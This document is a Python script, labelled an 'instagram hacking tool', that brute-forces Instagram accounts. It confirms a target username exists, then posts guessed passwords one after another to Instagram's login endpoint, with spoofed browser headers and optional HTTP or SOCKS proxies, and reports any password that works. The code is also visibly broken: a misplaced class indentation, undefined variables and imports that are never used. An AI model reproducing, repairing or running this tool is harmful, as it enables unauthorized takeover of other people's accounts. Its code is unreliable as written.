#instagram hacking tool
import argparse
import requests
import os
import codecs

import socket
import socks

import asyncio
from proxybroker import Broker

#argparser
def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('username', help='instagram username')
    parser.add_argument('password', help='instagram password')
    parser.add_argument('-p', '--proxy', help='proxy server')
    parser.add_argument('-s', '--socks', help='socks proxy server')
    return parser.parse_args()

if __name__ == '__main__':
    args = get_args()
    username = args.username
    password = args.password
    proxy = args.proxy
    socks = args.socks
    if socks:
        socks_proxy = 'socks5://' + socks
        socks_args = {'proxy': socks_proxy}
        print('Using socks proxy: ' + socks_proxy)
    else:
        socks_args = {}
    if proxy:
        http_proxy = 'http://' + proxy
        http_args = {'proxy': http_proxy}
        print('Using proxy: ' + http_proxy)
    else:
        http_args = {}

def clear(items):
    newList = []
    for item in items:
        if not (item == None or item == ''):
            if not item in newList:
                newList.append(item)

    return newList

#main class - Instagram bruteforce

    class Instagram:
        def __init__(self, username, password):
            self.username = username
            if not self.userExists():
                exit('[*] Can\'t find user named "%s"' % self.username)
            
            self.password = password

            self.attempts = 0

        def userExists(self):
            url = 'https://www.instagram.com/' + self.username
            r = requests.get(url, headers=headers, timeout=10)
            if r.status_code == 404:
                return False
            elif r.status_code == 200:
                return True
            else:
                 return False

        def _next(self):
            self.attempts += 1
            self.password.pop(0)
            self.login()


        def login(self):
            ses = requests.Session()
            #cookies
            ses.cookies.update({
                'ig_pr': '1',
                'ig_vw': '1920',
                'ig_vh': '1050',
                'ig_or': 'landscape-primary',
            })
            ses.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
                'X-Instagram-AJAX': '1',
                'X-Requested-With': 'XMLHttpRequest',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Accept': '*/*',
                'Accept-Language': 'en-US,en;q=0.8',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'X-CSRFToken': '',
                'X-IG-App-ID': '936619743392459',
                'Origin': 'https://www.instagram.com',
                'Referer': 'https://www.instagram.com/accounts/login/'
            })
            
            #login data
            data = {
                'username': self.username,
                'password': self.password[0],
                'queryParams': '{}',
                'optIntoOneTap': 'false'
            }
            #login url
            url = 'https://www.instagram.com/accounts/login/ajax/'
            #login request
            r = requests.post(url, headers=headers, data=data, cookies=cookies, timeout=10, **http_args)
            #print(r.text)
            #print(r.status_code)
            #print(r.headers)
            #print(r.cookies)
            #print(r.url)
            #print(r.history)
            #print(r.elapsed)
            #print(r.request)
            #print(r.encoding)
            #print(r.raw)

#update csrf token for the first time
        def update_csrf(self):
            url = 'https://www.instagram.com/accounts/login/ajax/'
            data = {
                'username': self.username,
                'password': self.password[0],
                'queryParams': '{}'
            }
            r = requests.post(url, data=data, headers=headers, cookies=cookies, timeout=10)
            if r.status_code == 200:
                if '"authenticated": true' in r.text:
                    print('[*] Password found: %s' % self.password[0])
                    exit(0)
                elif 'Please wait a few minutes before you try again' in r.text:
                    print('[*] Too many requests. Waiting an hour.')
                    exit(0)
                elif 'checkpoint_required' in r.text:
                    print('[*] Checkpoint required. Waiting an hour.')
                    exit(0)
                elif '"authenticated": false' in r.text:
                    print('[*] Wrong password: %s' % self.password[0])
                    if self.attempts < len(self.password):
                        self._next()
                    else:
                        exit(0)
                else:
                    print('[*] Unknown error. Exiting.')
                    exit(0)
            else:
                print('[*] Unknown error. Exiting.')
                exit(0)